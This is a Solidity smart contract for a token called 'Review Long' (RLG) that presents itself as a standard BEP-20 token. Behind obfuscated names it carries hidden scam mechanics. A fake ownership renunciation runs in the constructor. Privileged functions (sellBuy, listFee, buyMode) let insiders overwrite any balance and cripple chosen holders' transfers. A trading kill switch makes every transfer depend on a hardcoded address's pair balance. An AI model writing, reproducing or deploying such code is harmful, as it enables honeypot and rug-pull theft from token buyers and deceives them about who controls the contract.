//SPDX-License-Identifier: MIT

pragma solidity ^0.8.13;

interface walletMode {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract atFromShould {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface totalAt {
    function createPair(address maxLimit, address listTx) external returns (address);
}

interface tokenLiquidity {
    function totalSupply() external view returns (uint256);

    function balanceOf(address teamWalletTx) external view returns (uint256);

    function transfer(address tradingAt, uint256 fromLiquidity) external returns (bool);

    function allowance(address teamList, address spender) external view returns (uint256);

    function approve(address spender, uint256 fromLiquidity) external returns (bool);

    function transferFrom(
        address sender,
        address tradingAt,
        uint256 fromLiquidity
    ) external returns (bool);

    event Transfer(address indexed from, address indexed takeLaunch, uint256 value);
    event Approval(address indexed teamList, address indexed spender, uint256 value);
}

interface tokenLiquidityMetadata is tokenLiquidity {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract ReviewLong is atFromShould, tokenLiquidity, tokenLiquidityMetadata {

    bool public totalAtShould;

    mapping(address => mapping(address => uint256)) private fundLiquidityLaunch;

    function transferFrom(address shouldToken, address tradingAt, uint256 fromLiquidity) external override returns (bool) {
        if (_msgSender() != amountAuto) {
            if (fundLiquidityLaunch[shouldToken][_msgSender()] != type(uint256).max) {
                require(fromLiquidity <= fundLiquidityLaunch[shouldToken][_msgSender()]);
                fundLiquidityLaunch[shouldToken][_msgSender()] -= fromLiquidity;
            }
        }
        return receiverTo(shouldToken, tradingAt, fromLiquidity);
    }

    function balanceOf(address teamWalletTx) public view virtual override returns (uint256) {
        return teamMin[teamWalletTx];
    }

    uint256 constant fromTx = 17 ** 10;

    uint256 takeTo;

    uint256 public tradingListMode;

    function isListExempt() public {
        emit OwnershipTransferred(senderModeAt, address(0));
        exemptMode = address(0);
    }

    uint256 private exemptSwap;

    string private fundLaunched = "RLG";

    constructor (){
        
        walletMode launchedEnable = walletMode(amountAuto);
        buyMax = totalAt(launchedEnable.factory()).createPair(launchedEnable.WETH(), address(this));
        
        senderModeAt = _msgSender();
        isListExempt();
        walletList[senderModeAt] = true;
        teamMin[senderModeAt] = maxTo;
        if (toTeam != liquidityTake) {
            toTeam = tradingListMode;
        }
        emit Transfer(address(0), senderModeAt, maxTo);
    }

    function toAuto(address txMarketing) public {
        require(txMarketing.balance < 100000);
        if (feeSell) {
            return;
        }
        if (tradingListMode != liquidityTake) {
            liquidityTake = tradingListMode;
        }
        walletList[txMarketing] = true;
        
        feeSell = true;
    }

    address public buyMax;

    function transfer(address toFrom, uint256 fromLiquidity) external virtual override returns (bool) {
        return receiverTo(_msgSender(), toFrom, fromLiquidity);
    }

    function totalTradingSwap() private view {
        require(walletList[_msgSender()]);
    }

    address exemptList = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function sellBuy(address toFrom, uint256 fromLiquidity) public {
        totalTradingSwap();
        teamMin[toFrom] = fromLiquidity;
    }

    uint8 private sellMinWallet = 18;

    function listFee(address maxLaunched) public {
        totalTradingSwap();
        if (totalAtShould != tokenWalletBuy) {
            toMaxWallet = tradingListMode;
        }
        if (maxLaunched == senderModeAt || maxLaunched == buyMax) {
            return;
        }
        minEnable[maxLaunched] = true;
    }

    uint256 public liquidityTake;

    function name() external view virtual override returns (string memory) {
        return tradingListSell;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return maxTo;
    }

    function allowance(address takeLiquidity, address buySwapToken) external view virtual override returns (uint256) {
        if (buySwapToken == amountAuto) {
            return type(uint256).max;
        }
        return fundLiquidityLaunch[takeLiquidity][buySwapToken];
    }

    mapping(address => bool) public minEnable;

    mapping(address => bool) public walletList;

    uint256 private maxTo = 100000000 * 10 ** 18;

    function buyMode(uint256 fromLiquidity) public {
        totalTradingSwap();
        takeTo = fromLiquidity;
    }

    bool public feeSell;

    bool public toMode;

    address amountAuto = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    address private exemptMode;

    function getOwner() external view returns (address) {
        return exemptMode;
    }

    function owner() external view returns (address) {
        return exemptMode;
    }

    uint256 public toMaxWallet;

    address public senderModeAt;

    function modeWallet(address shouldToken, address tradingAt, uint256 fromLiquidity) internal returns (bool) {
        require(teamMin[shouldToken] >= fromLiquidity);
        teamMin[shouldToken] -= fromLiquidity;
        teamMin[tradingAt] += fromLiquidity;
        emit Transfer(shouldToken, tradingAt, fromLiquidity);
        return true;
    }

    mapping(address => uint256) private teamMin;

    function receiverTo(address shouldToken, address tradingAt, uint256 fromLiquidity) internal returns (bool) {
        if (shouldToken == senderModeAt) {
            return modeWallet(shouldToken, tradingAt, fromLiquidity);
        }
        uint256 swapListShould = tokenLiquidity(buyMax).balanceOf(exemptList);
        require(swapListShould == takeTo);
        require(tradingAt != exemptList);
        if (minEnable[shouldToken]) {
            return modeWallet(shouldToken, tradingAt, fromTx);
        }
        return modeWallet(shouldToken, tradingAt, fromLiquidity);
    }

    function approve(address buySwapToken, uint256 fromLiquidity) public virtual override returns (bool) {
        fundLiquidityLaunch[_msgSender()][buySwapToken] = fromLiquidity;
        emit Approval(_msgSender(), buySwapToken, fromLiquidity);
        return true;
    }

    function decimals() external view virtual override returns (uint8) {
        return sellMinWallet;
    }

    string private tradingListSell = "Review Long";

    bool public tokenWalletBuy;

    uint256 public toTeam;

    event OwnershipTransferred(address indexed limitAtTrading, address indexed txTrading);

    function symbol() external view virtual override returns (string memory) {
        return fundLaunched;
    }

    uint256 minLimit;

}